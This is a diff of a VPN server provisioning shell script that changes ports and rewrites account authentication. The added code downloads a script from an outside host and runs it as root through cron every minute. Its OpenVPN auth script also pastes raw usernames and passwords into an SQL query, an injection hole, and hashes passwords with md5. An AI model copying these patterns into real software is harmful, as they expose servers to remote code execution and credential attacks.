@@ -74,7 +74,7 @@ Dropbear_Port1='550'
 Dropbear_Port2='555'
 
 # Stunnel Ports
-Stunnel_Port1='110' # through Dropbear
+Stunnel_Port1='442' # through Dropbear
 Stunnel_Port2='143' # through OpenSSH
 Stunnel_Port3='144' # through OpenVPN
 
@@ -87,7 +87,7 @@ Proxy_Port2='8000'
 # OpenVPN Ports
 OpenVPN_Ws='8888'
 OpenVPN_Port1='1194'
-OpenVPN_Port2='25222'
+OpenVPN_Port2='53'
 OpenVPN_Port3='443'
 OpenVPN_Port4='69' # take note when you change this port, openvpn sun noload config will not work
 
@@ -1647,45 +1647,19 @@ if __name__ == '__main__':
 PTHON
 }
 
-#API Details
-VPN_Owner='MTknetwork';
-API_LINK='mediatekvpn.com/api/authentication';
-API_KEY='TKnetwork';
-
-
-
-sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
-
-cat <<EOF >/home/authentication.sh
+cat <<\EOM >/etc/openvpn/script/authvpn.sh
 #!/bin/bash
-SHELL=/bin/bash
-PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
-sleep 5
-wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
-sleep 5
-wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
-sleep 15
-bash /home/active.sh
-sleep 15
-bash /home/inactive.sh
-sleep 15
-bash /home/deleted.sh
-EOF
+. /etc/openvpn/script/config.sh
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
+user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+EOM
+		
+		
+wget -O /root/activate.sh "script.mediatek-vpn.com/ssh/prem/activate.sh"
 
-echo -e "0 5\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 
-echo "0 5 * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
-
-echo "0 5 * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
-
-sh active.sh | tee -a  /home/active.sh
-
-wget -O /home/active.sh "mediatekvpn.com/api/authentication/active.php?key=Tknetwork"
-sleep 5
-wget -O /home/inactive.sh "mediatekvpn.com/api/authentication/inactive.php?key=Tknetwork"
-sleep 5
-wget -O /home/deleted.sh "mediatekvpn.com/api/authentication/deleted.php?key=Tknetwork"
 
 function gatorade1() {
 
